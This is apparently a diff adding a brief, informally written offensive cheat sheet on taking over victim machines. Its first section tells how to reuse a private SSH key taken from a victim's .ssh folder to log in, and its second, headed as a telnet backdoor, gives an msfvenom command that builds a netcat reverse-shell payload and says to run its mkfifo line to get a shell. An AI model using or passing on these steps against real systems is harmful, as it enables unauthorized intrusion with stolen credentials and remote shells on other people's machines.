@@ -1,0 +1,21 @@
+
+SSH ACCESS USING PRIVATE KEY OF VICTIMS 
+
+When u have victim machine access and you get its .ssh folder files like
+Id_rsa(Private key) and id_rsa.pub(Public Key)  and downloaded on your own machine than what next
+
+Ssh into it using command but first the file u downloaded make it read and write only{chmod 600 <file>} 
+
+And then hit command
+Ssh -I id_rsa username@ip 
+
+
+
+
+TELNET        BACKDOOR         ACCESS 
+
+Make payload using msfvenom -p cmd/unix/reverse_netcat lhost=  lport= R
+
+And after the payload made copy whole line mkfifo to end and
+.RUN mkfifo …….. 
+And you get reverse shell
